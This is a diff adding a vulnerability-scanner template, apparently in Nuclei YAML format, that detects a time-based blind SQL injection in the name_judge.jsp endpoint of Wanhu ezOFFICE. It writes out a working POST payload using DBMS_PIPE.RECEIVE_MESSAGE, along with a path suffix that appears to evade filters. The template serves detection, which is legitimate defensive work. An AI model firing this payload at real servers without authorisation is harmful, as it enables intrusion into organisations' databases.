@@ -1,0 +1,49 @@
+id: poc-yaml-whir-ezoffice-name-judge-jsp-sqli
+info:
+  name: 万户 ezOFFICE name_judge.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in 万户OA ezOFFICE at the name_judge.jsp endpoint.
+    It leverages a time-based blind SQL injection technique using the DBMS_PIPE.RECEIVE_MESSAGE function.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1)+3}}'
+
+http:
+  - id: check-defaultroot
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/defaultroot"
+
+  - id: exploit-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "formType=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{t1}})--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
